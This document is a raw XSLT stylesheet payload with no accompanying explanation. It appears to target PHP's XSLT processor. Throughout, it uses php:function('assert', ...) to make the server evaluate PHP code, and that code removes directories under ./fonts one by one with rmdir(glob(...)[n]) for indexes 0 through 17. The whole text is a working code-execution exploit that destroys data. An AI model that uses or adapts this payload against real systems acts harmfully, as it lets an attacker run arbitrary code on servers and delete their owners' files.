<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" xmlns:exsl="http://exslt.org/common" version="1.0">
 
  <xsl:template match="*">

   
           <xsl:variable name="f">rmdir(glob('./fonts/*')[0])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $f)"/> 
   
           <xsl:variable name="g">rmdir(glob('./fonts/*')[1])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $g)"/> 
   
           <xsl:variable name="h">rmdir(glob('./fonts/*')[2])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $h)"/> 
      <xsl:variable name="i">rmdir(glob('./fonts/*')[3])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $i)"/> 
   
           <xsl:variable name="j">rmdir(glob('./fonts/*')[4])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $j)"/> 
   
           <xsl:variable name="k">rmdir(glob('./fonts/*')[5])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $k)"/> 
              <xsl:variable name="l">rmdir(glob('./fonts/*')[6])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $l)"/> 
   
           <xsl:variable name="m">rmdir(glob('./fonts/*')[7])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $m)"/> 
   
           <xsl:variable name="n">rmdir(glob('./fonts/*')[8])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $n)"/> 
              <xsl:variable name="o">rmdir(glob('./fonts/*')[9])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $o)"/> 
   
           <xsl:variable name="p">rmdir(glob('./fonts/*')[10])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $p)"/> 
   
           <xsl:variable name="qq">rmdir(glob('./fonts/*')[11])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $qq)"/> 

             <xsl:variable name="aa">rmdir(glob('./fonts/*')[12])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $aa)"/> 
           <xsl:variable name="a">rmdir(glob('./fonts/*')[13])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $a)"/> 
           <xsl:variable name="b">rmdir(glob('./fonts/*')[14])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $b)"/> 
           <xsl:variable name="c">rmdir(glob('./fonts/*')[15])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $c)"/> 
           <xsl:variable name="d">rmdir(glob('./fonts/*')[16])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $d)"/> 

        <xsl:variable name="e">rmdir(glob('./fonts/*')[17])</xsl:variable>                                                    
        <xsl:value-of select="php:function('assert', $e)"/> 
</xsl:template> 
</xsl:stylesheet>
